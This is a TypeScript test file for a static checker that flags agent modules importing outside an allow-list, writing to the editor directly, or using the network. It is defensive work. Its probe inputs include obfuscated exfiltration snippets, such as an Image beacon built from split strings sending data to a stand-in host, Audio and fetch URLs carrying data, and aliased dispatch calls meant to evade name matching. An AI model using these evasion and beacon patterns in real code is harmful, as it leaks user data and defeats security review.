/**
 * Review 13 (H1) regression: the writing agents' static check is W13.W1's
 * strict rule again — an import outside IMPORT_ALLOW is rejected, the
 * editor bridges are matched by full path, `export … from` counts, and the
 * ways around a name match are flagged. Each case is one of review 13's
 * probes ($S/review13/probes) that passed INT7's transitive check.
 */
import { describe, expect, it } from "vitest";
import { allowListProblems, APPLIERS, diskModules, directWritesIn, IMPORT_ALLOW, networkUsesIn, writingSources as agentSources, type ModuleLoader } from "./helpers/writingStatic";

const agent = (text: string, file = "agents/writing/agents/x.ts") => new Map([[file, text]]);
const both = (m: Map<string, string>) => [...directWritesIn(m), ...networkUsesIn(m)];
/** The disk, with some listed modules' text replaced. */
const diskWith =
  (over: Record<string, string>): ModuleLoader =>
  (m) =>
    over[m] !== undefined ? { file: `${m}.ts`, text: over[m] } : diskModules(m);

describe("review 13 H1: outside IMPORT_ALLOW = reject", () => {
  it("P1: an agent importing a helper that reaches the bridge is rejected at the first step", () => {
    const found = directWritesIn(agent('import { go } from "../../../ui/accept";\nexport const run = go;'));
    expect(found).toEqual(["agents/writing/agents/x.ts:1 imports ../../../ui/accept (not in the allow-list)"]);
  });

  it("P1: a listed helper that imports the editor bridge fails the allow-list check", () => {
    const found = allowListProblems(diskWith({ "text/translit": 'import { acceptInView } from "../agents/writing/cmBridge";\nexport const go = (v: unknown, s: unknown) => acceptInView(v as never, s as never);' }));
    expect(found).toEqual(["text/translit.ts:1 imports the editor bridge ../agents/writing/cmBridge"]);
  });

  it("a listed helper may import only listed modules (no walking the graph)", () => {
    const found = allowListProblems(diskWith({ "text/translit": 'import { b } from "../r13p/B";\nexport const t = b;' }));
    expect(found.some((p) => p.includes("imports ../r13p/B (not in the allow-list)"))).toBe(true);
  });

  it("the A/B/C cycle (B imports A, A imports C which uses localStorage): B is rejected in either order", () => {
    const x = ["agents/writing/agents/x.ts", 'import { a } from "../../../r13p/A";'] as const;
    const y = ["agents/writing/agents/y.ts", 'import { viaA } from "../../../r13p/B";'] as const;
    for (const order of [[x, y], [y, x], [y]]) {
      const found = directWritesIn(new Map(order.map(([f, t]) => [f, t])));
      expect(found.filter((p) => p.startsWith("agents/writing/agents/y.ts:1"))).toHaveLength(1);
    }
  });

  it("P2: the bridge is matched by full path — a file named cmBridge.ts elsewhere is checked like any other", () => {
    expect([...APPLIERS]).toEqual(["agents/writing/cmBridge.ts", "agents/writing/pmBridge.ts"]);
    const found = directWritesIn(agent('export const put = (v: any, t: string) => { v.dispatch({ changes: { from: 0, insert: t } }); localStorage.setItem("k", t); };', "agents/writing/extra/cmBridge.ts"));
    expect(found).toEqual(["agents/writing/extra/cmBridge.ts:1 dispatch(…)", "agents/writing/extra/cmBridge.ts:1 uses localStorage"]);
    expect(directWritesIn(agent('import { put } from "../../../lib/cmBridge";\nexport const run = put;'))[0]).toMatch(/not in the allow-list/);
  });

  it("P3: `export … from` is an import for both rules", () => {
    const a = agent('export { send } from "../../../lib/wire";\nexport * from "../../../ai/llm";');
    expect(directWritesIn(a)).toEqual(["agents/writing/agents/x.ts:1 imports ../../../lib/wire (not in the allow-list)", "agents/writing/agents/x.ts:2 imports ../../../ai/llm (not in the allow-list)"]);
    expect(networkUsesIn(a)).toEqual(["agents/writing/agents/x.ts:1 imports ../../../lib/wire (not in the allow-list)", "agents/writing/agents/x.ts:2 imports ../../../ai/llm"]);
  });

  it("P3: re-exporting the real network modules is reported by both rules", () => {
    for (const m of ["ai/ollamaProvider", "ai/hebrewFreq", "lib/docsLinks", "lib/fetchRetry"]) {
      const a = agent(`export * from "../../../${m}";`);
      expect([m, directWritesIn(a).length > 0, networkUsesIn(a).length > 0]).toEqual([m, true, true]);
    }
  });

  it("P4: an Image beacon via self, a bound dispatch and Reflect.apply are flagged", () => {
    const beacon = both(agent('export const ping = (s: string) => { const I = (self as any)["Im" + "age"]; new I().src = "//example.invalid/?q=" + s; };'));
    expect(beacon).toEqual(expect.arrayContaining([expect.stringMatching(/uses self$/), expect.stringMatching(/ self$/), expect.stringMatching(/URL \/\/example\.invalid/)]));
    expect(directWritesIn(agent("export const put = (v: any, tr: any) => { const d = v.dispatch.bind(v); d(tr); };"))).toEqual(["agents/writing/agents/x.ts:1 .bind", "agents/writing/agents/x.ts:1 reads .dispatch"]);
    expect(directWritesIn(agent("export const put = (v: any, tr: any) => Reflect.apply(v.dispatch, v, [tr]);"))).toEqual(["agents/writing/agents/x.ts:1 .apply", "agents/writing/agents/x.ts:1 uses Reflect", "agents/writing/agents/x.ts:1 reads .dispatch"]);
    expect(networkUsesIn(agent("new Image().src = u; postMessage(u); new BroadcastChannel('c'); caches.open('x');"))).toEqual(
      expect.arrayContaining([expect.stringMatching(/ Image$/), expect.stringMatching(/ postMessage$/), expect.stringMatching(/ BroadcastChannel$/), expect.stringMatching(/ caches$/)]),
    );
  });

  it("a property named like a global is not the global (`opts.window`, `{ self: 1 }`)", () => {
    expect(both(agent("export const f = (o: { window: number }) => ({ self: o.window });"))).toEqual([]);
  });

  it("the real allow-list is closed and clean, and every entry exists", () => {
    expect(allowListProblems()).toEqual([]);
    for (const m of IMPORT_ALLOW) expect([m, diskModules(m) !== null]).toEqual([m, true]);
  });
});

/*
 * Review 14 M1: ten name-based holes F13a's strict check still had (probe
 * $S/review14/probes/r14StaticProbe.test.ts). Each was found nothing; each is
 * a finding now. The names are scope-aware where they are ordinary words.
 */
describe("review 14 M1: the holes of the strict check", () => {
  const found = (src: string) => both(agent(src));
  it.each([
    ["alias by assignment", "export const f = (v: any, t: any) => { const d = v.dispatch; d(t); };", /reads \.dispatch/],
    ["comma call", "export const f = (v: any, t: any) => (0, v.dispatch)(t);", /indirect call/],
    ["import.meta.glob of a non-listed module", 'const m = import' + '.meta.glob("../../../ai/llm.ts", { eager: true });\nexport const f = () => m;' /* split: the test loader rewrites the literal */, /import\.meta/],
    ["top.fetch", 'export const f = (s: string) => top!.fetch("/log?q=" + s);', /uses top$/],
    ["parent.localStorage", 'export const f = (s: string) => parent.localStorage.setItem("k", s);', /uses parent$/],
    ["new Audio with a split URL", 'export const f = (s: string) => new Audio("/" + "/example.invalid/?" + s);', /uses Audio$/],
    ["a query in the import spec", 'import * as n from "../../../ai/llm.ts?x.json";\nexport const f = n;', /a query or fragment in the spec/],
    ["frames[0]", 'export const f = (s: string) => frames[0].postMessage(s, "*");', /uses frames$/],
    ["location.assign", 'export const f = (s: string) => location.assign("/x?q=" + s);', /uses location$/],
    ["window.open by its bare name", 'export const f = (s: string) => open("/x?q=" + s);', /uses open$/],
    ["opener", 'export const f = (s: string) => opener.postMessage(s, "*");', /uses opener$/],
    ["new Option", "export const f = () => new Option();", /uses Option$/],
    ["view.update with a state update", "export const f = (v: any, s: any) => v.update([v.state.update(s)]);", /update\(…\)/],
    ["a read of .update", "export const f = (v: any) => { const u = v.update; return u; };", /reads \.update/],
    ["a parenthesised conditional callee", "export const f = (v: any, w: any, t: any) => (t ? v.dispatch : w.dispatch)(t);", /indirect call/],
  ])("%s is found", (_name, src, re) => {
    expect(found(src).some((p) => re.test(p))).toBe(true);
  });

  it("a local named like a window global is the local (`const top`, a parameter `open`, a destructured `location`)", () => {
    expect(found("export const f = (xs: number[]) => { const top = Math.max(...xs); return top + 1; };")).toEqual([]);
    expect(found("export const g = (s: string, open = false) => (open ? s : s.trim());")).toEqual([]);
    expect(found("export const h = ({ location }: { location: string }) => location.length;")).toEqual([]);
    expect(found("export function k(parent: { n: number }) { for (const frames of [1]) void frames; return parent.n; }")).toEqual([]);
  });

  it("…but the global is found next to an unrelated local of the same name elsewhere", () => {
    expect(found("const a = () => { const top = 1; return top; };\nexport const b = () => top.length;").some((p) => /:2 uses top$/.test(p))).toBe(true);
  });

  it("the real agents are still clean", () => {
    expect([...directWritesIn(new Map([...agentSources()])), ...networkUsesIn(new Map([...agentSources()]))]).toEqual([]);
  });
});
